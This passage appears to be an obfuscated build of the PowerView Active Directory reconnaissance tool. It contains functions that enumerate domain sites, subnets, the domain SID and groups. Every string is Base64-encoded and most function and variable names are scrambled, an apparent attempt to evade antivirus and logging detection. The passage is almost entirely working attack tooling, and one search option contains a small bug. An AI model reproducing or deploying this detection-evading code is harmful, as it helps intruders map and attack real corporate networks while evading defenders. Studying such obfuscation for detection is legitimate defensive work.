        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${__/\/=\/\/==\_/=\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
    }
    PROCESS {
        if (${__/\/=\/\/==\_/=\}) {
            ${__/\_/==\_/\/\___} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${/\______/===\__/\} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQAuACoA')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${____/\_/=\/\/\__/} = ${/\______/===\__/\}.SubString(${/\______/===\__/\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAeAB0AHIAYQBjAHQAZQBkACAAZABvAG0AYQBpAG4AIAAnACQAewBfAF8AXwBfAC8AXABfAC8APQBcAC8AXAAvAFwAXwBfAC8AfQAnACAAZgByAG8AbQAgACcAJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACcA')))
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\_/=\/\/\__/}
                        ${__/\/=\/\/==\_/=\} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                        if (-not ${__/\/=\/\/==\_/=\}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFUAbgBhAGIAbABlACAAdABvACAAcgBlAHQAcgBpAGUAdgBlACAAZABvAG0AYQBpAG4AIABzAGUAYQByAGMAaABlAHIAIABmAG8AcgAgACcAJAB7AF8AXwBfAF8ALwBcAF8ALwA9AFwALwBcAC8AXABfAF8ALwB9ACcA')))
                        }
                    }
                }
                else {
                    try {
                        ${_/=\_/=====\__/=\} = (-Join (([Guid]${/\______/===\__/\}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AFwAXwAvAD0APQA9AD0APQBcAF8AXwAvAD0AXAB9ACkA')))
                    }
                    catch {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkA')))
                    }
                }
            }
            if (${__/\_/==\_/\/\___} -and (${__/\_/==\_/\/\___}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8ALwBcAF8ALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBQAEwAaQBuAGsA')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABzAGkAdABlAHMAIAB3AGkAdABoACAAJAB7AF8ALwA9AFwALwA9AD0AXAAvAD0APQBcAF8ALwA9AFwALwBcAH0AIABzAGUAdAAgAGkAbgAgAHQAaABlACAAZwBwAEwAaQBuAGsAIABwAHIAbwBwAGUAcgB0AHkA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABnAHAAbABpAG4AawA9ACoAJAB7AF8ALwA9AFwALwA9AD0AXAAvAD0APQBcAF8ALwA9AFwALwBcAH0AKgApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAFUAcwBpAG4AZwAgAGEAZABkAGkAdABpAG8AbgBhAGwAIABMAEQAQQBQACAAZgBpAGwAdABlAHIAOgAgACQATABEAEEAUABGAGkAbAB0AGUAcgA=')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${__/\/=\/\/==\_/=\}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwBpAHQAZQApACQARgBpAGwAdABlAHIAKQA=')))
            Write-Verbose "[Get-DomainSite] Get-DomainSite filter string: $(${__/\/=\/\/==\_/=\}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${__/\/=\/\/==\_/=\}.FindAll() }
            else { ${_/\__/\/=====\_/\} = ${__/\/=\/\/==\_/=\}.FindAll() }
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${___/\_/\/\__/=\__} = $_
                }
                else {
                    ${___/\_/\/\__/=\__} = _______/==\_/=\_/= -Properties $_.Properties
                }
                ${___/\_/\/\__/=\__}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAGkAdABlAA=='))))
                ${___/\_/\/\__/=\__}
            }
            if (${_/\__/\/=====\_/\}) {
                try { ${_/\__/\/=====\_/\}.dispose() }
                catch {
                    Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAaQB0AGUAXQAgAEUAcgByAG8AcgAgAGQAaQBzAHAAbwBzAGkAbgBnACAAbwBmACAAdABoAGUAIABSAGUAcwB1AGwAdABzACAAbwBiAGoAZQBjAHQA')))
                }
            }
            ${__/\/=\/\/==\_/=\}.dispose()
        }
    }
}
function Get-DomainSubnet {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [String]
        $SiteName,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{
            'SearchBasePrefix' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwB1AGIAbgBlAHQAcwAsAEMATgA9AFMAaQB0AGUAcwAsAEMATgA9AEMAbwBuAGYAaQBnAHUAcgBhAHQAaQBvAG4A')))
        }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${_/=\/\_____/\/\/=} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
    }
    PROCESS {
        if (${_/=\/\_____/\/\/=}) {
            ${__/\_/==\_/\/\___} = ''
            $Filter = ''
            $Identity | ? {$_} | % {
                ${/\______/===\__/\} = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if (${/\______/===\__/\} -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQAuACoA')))) {
                    ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABkAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAG4AYQBtAGUAPQAkAHsALwBcAF8AXwBfAF8AXwBfAC8APQA9AD0AXABfAF8ALwBcAH0AKQA=')))
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        ${____/\_/=\/\/\__/} = ${/\______/===\__/\}.SubString(${/\______/===\__/\}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABFAHgAdAByAGEAYwB0AGUAZAAgAGQAbwBtAGEAaQBuACAAJwAkAHsAXwBfAF8AXwAvAFwAXwAvAD0AXAAvAFwALwBcAF8AXwAvAH0AJwAgAGYAcgBvAG0AIAAnACQAewAvAFwAXwBfAF8AXwBfAF8ALwA9AD0APQBcAF8AXwAvAFwAfQAnAA==')))
                        ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = ${____/\_/=\/\/\__/}
                        ${_/=\/\_____/\/\/=} = _/=\_/=\_/==\_/\/\ @_/\/\/\/\___/\/\/
                        if (-not ${_/=\/\_____/\/\/=}) {
                            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABVAG4AYQBiAGwAZQAgAHQAbwAgAHIAZQB0AHIAaQBlAHYAZQAgAGQAbwBtAGEAaQBuACAAcwBlAGEAcgBjAGgAZQByACAAZgBvAHIAIAAnACQAewBfAF8AXwBfAC8AXABfAC8APQBcAC8AXAAvAFwAXwBfAC8AfQAnAA==')))
                        }
                    }
                }
                else {
                    try {
                        ${_/=\_/=====\__/=\} = (-Join (([Guid]${/\______/===\__/\}).ToByteArray() | % {$_.ToString('X').PadLeft(2,'0')})) -Replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAuAC4AKQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAkADEA')))
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABvAGIAagBlAGMAdABnAHUAaQBkAD0AJAB7AF8ALwA9AFwAXwAvAD0APQA9AD0APQBcAF8AXwAvAD0AXAB9ACkA')))
                    }
                    catch {
                        ${__/\_/==\_/\/\___} += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABuAGEAbQBlAD0AJAB7AC8AXABfAF8AXwBfAF8AXwAvAD0APQA9AFwAXwBfAC8AXAB9ACkA')))
                    }
                }
            }
            if (${__/\_/==\_/\/\___} -and (${__/\_/==\_/\/\___}.Trim() -ne '') ) {
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB8ACQAewBfAF8ALwBcAF8ALwA9AD0AXABfAC8AXAAvAFwAXwBfAF8AfQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) {
                Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABVAHMAaQBuAGcAIABhAGQAZABpAHQAaQBvAG4AYQBsACAATABEAEEAUAAgAGYAaQBsAHQAZQByADoAIAAkAEwARABBAFAARgBpAGwAdABlAHIA')))
                $Filter += $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('JABMAEQAQQBQAEYAaQBsAHQAZQByAA==')))
            }
            ${_/=\/\_____/\/\/=}.filter = $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAmACgAbwBiAGoAZQBjAHQAQwBhAHQAZQBnAG8AcgB5AD0AcwB1AGIAbgBlAHQAKQAkAEYAaQBsAHQAZQByACkA')))
            Write-Verbose "[Get-DomainSubnet] Get-DomainSubnet filter string: $(${_/=\/\_____/\/\/=}.filter)"
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBpAG4AZABPAG4AZQA=')))]) { ${_/\__/\/=====\_/\} = ${_/=\/\_____/\/\/=}.FindOne() }
            else { ${_/\__/\/=====\_/\} = ${_/=\/\_____/\/\/=}.FindAll() }
            ${_/\__/\/=====\_/\} | ? {$_} | % {
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) {
                    ${_/==\/\/\__/\/\/\} = $_
                }
                else {
                    ${_/==\/\/\__/\/\/\} = _______/==\_/=\_/= -Properties $_.Properties
                }
                ${_/==\/\/\__/\/\/\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBTAHUAYgBuAGUAdAA='))))
                if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBpAHQAZQBOAGEAbQBlAA==')))]) {
                    if (${_/==\/\/\__/\/\/\}.properties -and (${_/==\/\/\__/\/\/\}.properties.siteobject -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAkAFMAaQB0AGUATgBhAG0AZQAqAA=='))))) {
                        ${_/==\/\/\__/\/\/\}
                    }
                    elseif (${_/==\/\/\__/\/\/\}.siteobject -like $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KgAkAFMAaQB0AGUATgBhAG0AZQAqAA==')))) {
                        ${_/==\/\/\__/\/\/\}
                    }
                }
                else {
                    ${_/==\/\/\__/\/\/\}
                }
            }
            if (${_/\__/\/=====\_/\}) {
                try { ${_/\__/\/=====\_/\}.dispose() }
                catch {
                    Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMAdQBiAG4AZQB0AF0AIABFAHIAcgBvAHIAIABkAGkAcwBwAG8AcwBpAG4AZwAgAG8AZgAgAHQAaABlACAAUgBlAHMAdQBsAHQAcwAgAG8AYgBqAGUAYwB0ADoAIAAkAF8A')))
                }
            }
            ${_/=\/\_____/\/\/=}.dispose()
        }
    }
}
function __/\/=\___/==\_/=\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${_/\/\/\/\___/\/\/} = @{
        'LDAPFilter' = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADgAMQA5ADIAKQA=')))
    }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    ${_/\/\_/==\/\_/===} = __/\/\/=\/\_/==\/\ @_/\/\/\/\___/\/\/ -FindOne | select -First 1 -ExpandProperty objectsid
    if (${_/\/\_/==\/\_/===}) {
        ${_/\/\_/==\/\_/===}.SubString(0, ${_/\/\_/==\/\_/===}.LastIndexOf('-'))
    }
    else {
        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFMASQBEAF0AIABFAHIAcgBvAHIAIABlAHgAdAByAGEAYwB0AGkAbgBnACAAZABvAG0AYQBpAG4AIABTAEkARAAgAGYAbwByACAAJwAkAEQAbwBtAGEAaQBuACcA')))
    }
}
function __/\_/\/\__/==\/\_ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        ${___/\_/\/=\/\/\/\_},
        [Switch]
        ${_/=\_/=\___/=\_/\_},
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        ${______/=====\_/\/=},
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        ${___/=\_/\_/\/\___/},
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        ${_/\/\/\/\___/\/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${_/\/\/\/\___/\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
